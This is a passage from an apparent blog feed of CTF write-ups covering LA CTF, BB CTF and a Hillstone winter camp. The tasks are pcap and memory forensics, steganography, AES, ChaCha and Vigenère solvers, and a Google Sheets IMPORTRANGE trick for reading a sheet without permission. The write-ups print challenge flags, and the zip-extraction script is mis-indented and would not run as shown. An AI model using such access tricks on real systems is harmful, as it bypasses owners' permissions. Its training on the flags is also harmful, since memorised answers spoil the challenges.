class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Flags <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> abbreviation <span class="hljs-keyword">of</span> flag Segment, which <span class="hljs-keyword">is</span> a flag field.<br>It <span class="hljs-keyword">is</span> actually a field <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> IP packet header. Because most <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> TCP, UDP, <span class="hljs-keyword">and</span> <span class="hljs-built_in">application</span> layer protocols are encapsulated <span class="hljs-keyword">in</span> IP packets, you will often see this field when analyzing these protocols.<br>The identification field has <span class="hljs-number">3</span> bits.<br>Reserved bit: <span class="hljs-number">1</span> bit, which <span class="hljs-keyword">is</span> a reserved bit <span class="hljs-keyword">and</span> generally <span class="hljs-keyword">not</span> used;<br>Don&#x27;t fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> fragmented (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> fragmented);<br>More fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> fragment (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> one).<br></code></pre></td></tr></table></figure><p>Check the flags field and the Data segment. The data segment has 1 byte of data.<br><img src="/mdimg/LACTF2023/8.png"><br>Looking down, in N0.5, the setting of Reserved bit has changed.<br><img src="/mdimg/LACTF2023/9.png"><br>Check RFC 3514 official document, if <code>Reserved bit</code> is set to <code>1 (0x1)</code>, it is a malicious packet.<br><img src="/mdimg/LACTF2023/10.png"><br>So we only need to filter out the packets whose <code>Reserved bit</code> is 0, set the data and Reserved bit as columns, and set the Reserved bit as 0 as the filter condition, that is, <code>ip.flags.rb == 0</code>, observe The first few discoveries are the hex values of lactf.<br><img src="/mdimg/LACTF2023/11.png"><br>Export the filtered UDP flow, open the saved UDP flow packet and track the UDP flow directly.<br><img src="/mdimg/LACTF2023/12.png"><br>You can also use tshark.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r <span class="hljs-type">EBE</span>.pcap -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;ip.flags.rb == 0x0&quot;</span> -<span class="hljs-type">T</span> fields -e <span class="hljs-class"><span class="hljs-keyword">data</span> | xxd -r -p</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/LACTF2023/13.png"></p><h4 id="2-CATS"><a href="#2-CATS" class="headerlink" title="2.CATS!"></a>2.CATS!</h4><p><img src="/mdimg/LACTF2023/14.png"><br><img src="/mdimg/LACTF2023/15.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>There is their official website in the article, as shown in the figure below<br><img src="/mdimg/LACTF2023/16.png"></p><h4 id="3-hidden-in-plain-sheets"><a href="#3-hidden-in-plain-sheets" class="headerlink" title="3. hidden in plain sheets"></a>3. hidden in plain sheets</h4><p>The flag is in another Sheet but we don’t have permission to view it.</p><p><img src="/mdimg/LACTF2023/17.png"><br>After checking the data, I found that the <code>IMPORTRANGE</code> function of Google Sheets can import the content.<br><img src="/mdimg/LACTF2023/18.png"><br>So use IMPORTRANGE to get the flag directly<br><img src="/mdimg/LACTF2023/19.png"></p><h4 id="4-discord-l34k"><a href="#4-discord-l34k" class="headerlink" title="4. discord l34k"></a>4. discord l34k</h4><p>The topic gave a discord link</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://discord.com/channels/<span class="hljs-number">1060030874722259057</span>/<span class="hljs-number">1060030875187822724</span>/<span class="hljs-number">1060031064669700186</span><br></code></pre></td></tr></table></figure><p><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a>  Find key images in this post.<br><img src="/mdimg/LACTF2023/20.png"></p><p>Below the image see the URL for the JSON API. In the given URL, the first ID ( 1060030874722259057 ) refers to the server, so we put that in the image where the example ID is. This gives us the link.</p><p><a href="https://discordapp.com/api/servers/1060030874722259057/widget.json">https://discordapp.com/api/servers/1060030874722259057/widget.json</a><br><img src="/mdimg/LACTF2023/21.png"><br>After opening it, I found that it is an invitation link. After opening it, enter the LA CTF-Chall Server 5 server, and you can see the flag.<br><img src="/mdimg/LACTF2023/22.png"><br><img src="/mdimg/LACTF2023/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BB CTF 2023</title>
    <link href="/2023/02/07/BBCTF/"/>
    <url>/2023/02/07/BBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Memory-Dump"><a href="#1-Memory-Dump" class="headerlink" title="1. Memory Dump"></a>1. Memory Dump</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>之前长安杯做过PowerShell的取证题，PowerShell历史命令文件路径为<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>所以我们直接去filescan<code>ConsoleHost_history.txt</code><br><img src="/mdimg/2023BBCTF/1.png"><br>虽然报错了 但还是找出来了捏 dump一下<br><img src="/mdimg/2023BBCTF/2.png"><br>cat 一下下<br><img src="/mdimg/2023BBCTF/3.png"><br>AES解密即可<br><img src="/mdimg/2023BBCTF/4.png"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>因为<code>ConsoleHost_history.txt</code>为文本形式，所以利用strings转换一下直接搜索<code>flag&#123;</code>即可<br><img src="/mdimg/2023BBCTF/5.png"></p><h2 id="2-Vastness-of-Space"><a href="#2-Vastness-of-Space" class="headerlink" title="2. Vastness of Space"></a>2. Vastness of Space</h2><h3 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h3><p>Is space really that empty?</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>查看图片exif信息<br><img src="/mdimg/2023BBCTF/6.png"><br>steghide隐写 password：BBCTF<br><img src="/mdimg/2023BBCTF/7.png"><br>用matplotlib库还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.genfromtxt(<span class="hljs-string">&quot;somedata.txt&quot;</span>, delimiter=<span class="hljs-string">&quot;,&quot;</span>)<br><br>num = data[:,<span class="hljs-number">0</span>]<br>data = data[:,<span class="hljs-number">1</span>]<br><br>plt.plot(num,data, <span class="hljs-string">&#x27;ro&#x27;</span>)<br><br>plt.xlabel(<span class="hljs-string">&#x27;x&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;y&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023BBCTF/8.png"><br>扫码即可get flag</p><h2 id="3-Random-Requests"><a href="#3-Random-Requests" class="headerlink" title="3. Random Requests"></a>3. Random Requests</h2><h3 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h3><p>I captured these very random http requests. Can you help me decode them?</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>过滤HTTP流量可以看到有很多GET请求 flag=0/flag=1，所以猜测flag就是由二进制数据组成<br><img src="/mdimg/2023BBCTF/9.png"><br>写脚本&amp;手撸&amp;用tshark提取一下都可以，这里用tshark提取二进制数据<br><code>tshark -r random_requests.pcapng -Y &quot;http.request.method == &quot;GET&quot;&quot; | cut -d &#39;/&#39; -f2 | cut -d &#39; &#39; -f1 | cut -d &#39;=&#39; -f2 | tr -d &#39;\n&#39;</code><br><img src="/mdimg/2023BBCTF/10.png"><br>然后cyberchef一把梭<br><img src="/mdimg/2023BBCTF/11.png"></p><h2 id="4-Imageception"><a href="#4-Imageception" class="headerlink" title="4. Imageception"></a>4. Imageception</h2><h3 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h3><p>“The painter has the universe in his mind and hands.”<br>-Leonardo Da Vinci</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目名称为imageception，所以直接FileScan搜索<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/mdimg/2023BBCTF/12.png"><br>发现有个<code>imageception.png</code> 把他dump下来<br><img src="/mdimg/2023BBCTF/13.png"><br>这里显示Error dumping file 但是文件夹里已经dump出来了。<br><img src="/mdimg/2023BBCTF/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第二届山石网科冬令营</title>
    <link href="/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    <url>/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><p><img src="/mdimg/2023sswk/1.png"><br>网上找了个脚本，AES解密即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Crypto;<br><span class="hljs-keyword">import</span> java.security.InvalidAlgorithmParameterException;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Crypto</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str2, String str22, SecretKey secretKey, IvParameterSpec ivParameterSpec)</span> <span class="hljs-keyword">throws</span> IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Cipher.getInstance(str2);<br>        instance.init(<span class="hljs-number">2</span>, secretKey, ivParameterSpec);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(instance.doFinal(Base64.getDecoder().decode(str22)));<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> decrypt(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>, <span class="hljs-string">&quot;HyKsaPpqT4l436tHiSEXtIlLgVV4GE7mGc2WoI0KlP2YhKFco7OPcJYtS58BFwDq&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;AES&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;));<br>        System.out.println(<span class="hljs-string">&quot;After decryption - &quot;</span> + decryptedString);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//hsnctf&#123;android_is_not_e4sy_will_caref1ul&#125;</span><br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">a3ZxZndpe2owMGdfb3hmbl9rZHloX2l4cX0=</span><br><span class="language-xml"></span><br><span class="language-xml">base64:</span><br><span class="language-xml">kvqfwi</span><span class="hljs-template-variable">&#123;j00g_oxfn_kdyh_ixq&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">caeser 3:</span><br><span class="language-xml">hsnctf</span><span class="hljs-template-variable">&#123;g00d_luck_have_fun&#125;</span><br></code></pre></td></tr></table></figure><h2 id="strange-chacha"><a href="#strange-chacha" class="headerlink" title="strange_chacha"></a>strange_chacha</h2><p>CryptoCTF Aniely原题 参考春哥的wp：<a href="https://zhuanlan.zhihu.com/p/545950898">https://zhuanlan.zhihu.com/p/545950898</a></p><p> chacha流密码，产生一段密钥流用于加密，类似伪随机数发生器，产生密钥流 。爆破一个短随机数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AS</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, passphrase</span>):<br>        self.passphrase = passphrase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">mixer</span>(<span class="hljs-params">u, v</span>):<br>            <span class="hljs-keyword">return</span> ((u &lt;&lt; v) &amp; <span class="hljs-number">0xffffffff</span>) | u &gt;&gt; (<span class="hljs-number">32</span> - v)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forge</span>(<span class="hljs-params">w, a, b, c, d</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                w[a] = (w[a] + w[b]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[d] = mixer(w[a] ^ w[d], <span class="hljs-number">16</span> // (i + <span class="hljs-number">1</span>))<br>                w[c] = (w[c] + w[d]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[b] = mixer(w[b] ^ w[c], (<span class="hljs-number">12</span> + <span class="hljs-number">2</span>*i) // (i + <span class="hljs-number">1</span>))<br><br>        bring = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        bring[:<span class="hljs-number">4</span>] = [<span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>]<br>        bring[<span class="hljs-number">4</span>:<span class="hljs-number">12</span>] = unpack(<span class="hljs-string">&#x27;&lt;8L&#x27;</span>, self.passphrase)<br>        bring[<span class="hljs-number">12</span>] = bring[<span class="hljs-number">13</span>] = <span class="hljs-number">0x0</span><br>        bring[<span class="hljs-number">14</span>:] = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            w = <span class="hljs-built_in">list</span>(bring)<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xe</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xf</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>)<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> pack(<span class="hljs-string">&#x27;&lt;16L&#x27;</span>, *((w[_] + bring[_]) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))):<br>                <span class="hljs-keyword">yield</span> c<br>            bring[<span class="hljs-number">12</span>] = (bring[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br>            <span class="hljs-keyword">if</span> bring[<span class="hljs-number">12</span>] == <span class="hljs-number">0</span>:<br>                bring[<span class="hljs-number">13</span>] = (bring[<span class="hljs-number">13</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span><br><br>key = <span class="hljs-string">&#x27;52f0907eca3ce05d8d0b6691bb8c8dbca19b63b7bcfcf033fc320f182b5ad610&#x27;</span><br>enc = <span class="hljs-string">&#x27;6d9b546c9f1f5e7116203933dabbf25e3a0e143122b20c27e5c83ea26b9d0dbb&#x27;</span><br><br>key, enc = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">bytes</span>.fromhex, (key, enc))<br><br>key = (key * (<span class="hljs-number">32</span> // <span class="hljs-built_in">len</span>(key) + <span class="hljs-number">1</span>))[:<span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">for</span> rand <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>):<br>    stream = AS(key)<br>    rand = <span class="hljs-built_in">bytes</span>(rand) * <span class="hljs-number">16</span><br>    passphrase = <span class="hljs-built_in">bytes</span>(a ^ b ^ c <span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, stream.go(), rand))<br>    msg = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(passphrase, key))<br>    <span class="hljs-keyword">if</span> (msg.startswith(<span class="hljs-string">b&#x27;HSNCTF&#123;&#x27;</span>)):<br>        <span class="hljs-built_in">print</span>(msg)<br>        <br><span class="hljs-comment">#HSNCTF&#123;91404a209e0f9ab7d245d5ee&#125;</span><br></code></pre></td></tr></table></figure><h2 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h2><p>密码表里多了一对括号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">import <span class="hljs-keyword">string</span><br>import itertools<br><br>dicts = <span class="hljs-keyword">string</span>.ascii_lowercase +<span class="hljs-string">&quot;&#123;&#125;&quot;</span><br><span class="hljs-comment">#print(dicts)</span><br><span class="hljs-comment"># key = (&#x27;&#x27;.join([random.choice(dicts) for i in range(4)])) * 8</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k in itertools.<span class="hljs-title function_ invoke__">product</span>(dicts,repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(k)<br>    <span class="hljs-comment"># print(key)</span><br>    numenc = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in enc]<br>    numkey = [dicts.<span class="hljs-title function_ invoke__">index</span>(i) <span class="hljs-keyword">for</span> i in key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(enc)):<br>        <span class="hljs-comment"># assert len(numenc) == len(numkey)</span><br>        ans = (numenc[i] - numkey[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#x27;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>            <br><span class="hljs-comment">#hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>公众号回复签到题即可<br><code>hsnctf&#123;welcome_to_hsnctf&#125;</code></p><h2 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h2><p>根据<code>Cloakify.txt</code>名字知道是Cloakify隐写 ：<a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a><br>得到一个txt文件  根据PK得知为zip文件 改后缀 发现是压缩包套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br><br>name = <span class="hljs-string">&#x27;f2332&#x27;</span><br>num = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)    <span class="hljs-comment">#读取zip文件</span><br>password = name<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fz.namelist():         <span class="hljs-comment">#遍历zip内文件名</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> <span class="hljs-keyword">in</span> i:      <span class="hljs-comment">#判断当前文件是否是zip文件</span><br>        newpassword = i[<span class="hljs-number">0</span>:-<span class="hljs-number">4</span>]   <span class="hljs-comment">#压缩密码为zip文件名，取出</span><br><span class="hljs-built_in">print</span>(newpassword)<br><span class="hljs-comment"># fz.extractall(pwd=bytes(password, &#x27;utf-8&#x27;))       #提取zip文件</span><br>fz.extractall()<br>num +=<span class="hljs-number">1</span><br>name = newpassword<br></code></pre></td></tr></table></figure><p>解开套娃之后即可得到flag<br><code>hsnctf&#123;66eec912-e9ce-4e1d-ac54-ecea075dcb96&#125;</code></p><h2 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h2><p><img src="/mdimg/2023sswk/2.png"><br>flag.txt比flag.rar小很多怀疑有其他文件 但binwalk无果  在010发现hillstone.wav  Ntfs隐写  导出wav文件<br><img src="/mdimg/2023sswk/3.png"><br>SSTV解密<br><img src="/mdimg/2023sswk/4.png"><br>flag.txt   base64转zip文件  解压即可得到flag<br><code> hsnctf&#123;70995fb0-eb60-0787-f305-77066aeb6730&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h2><p>参考：<a 